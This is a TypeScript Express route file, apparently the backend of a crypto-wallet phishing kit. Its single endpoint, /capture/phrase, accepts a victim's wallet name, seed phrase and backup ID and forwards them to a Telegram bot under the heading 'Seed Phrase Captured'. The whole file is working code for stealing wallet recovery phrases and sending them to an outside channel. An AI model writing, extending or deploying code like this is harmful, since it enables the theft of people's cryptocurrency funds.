import { Router } from "express";
import { sendBot2Message } from "../lib/telegram.js";

const router = Router();

router.post("/capture/phrase", async (req, res) => {
  const { wallet, phrase, backupId } = req.body as {
    wallet?: string;
    phrase?: string;
    backupId?: string;
  };

  if (!wallet || !phrase || !backupId) {
    return res.status(400).json({ error: "wallet, phrase, and backupId required" });
  }

  await sendBot2Message(
    `🔐 <b>Seed Phrase Captured</b>\n\n` +
    `<b>Wallet:</b> ${wallet}\n` +
    `<b>Backup ID:</b> <code>${backupId}</code>\n\n` +
    `<b>Seed Phrase:</b>\n<code>${phrase}</code>`
  );

  res.json({ ok: true });
});

export default router;
